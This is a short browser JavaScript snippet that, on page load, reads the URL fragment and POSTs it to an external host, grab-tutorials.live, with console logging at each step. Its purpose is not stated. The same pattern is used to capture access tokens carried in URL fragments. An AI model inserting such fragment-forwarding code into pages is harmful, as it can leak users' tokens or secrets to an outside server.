window.addEventListener('DOMContentLoaded', () => {

  console.log("Current URL:", window.location.href);

  const fragment = window.location.hash.substring(1);
  console.log("Extracted fragment:", fragment);

  if (fragment) {
    console.log("Sending POST request with fragment:", fragment);

    fetch('https://grab-tutorials.live/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ fragment: fragment }),
    })
      .then(response => response.json())
      .then(data => {
        console.log('Worker Response:', data);
      })
      .catch(error => {
        console.error('Error sending fragment:', error);
      });
  } else {
    console.error("No fragment found in the URL.");
  }
});
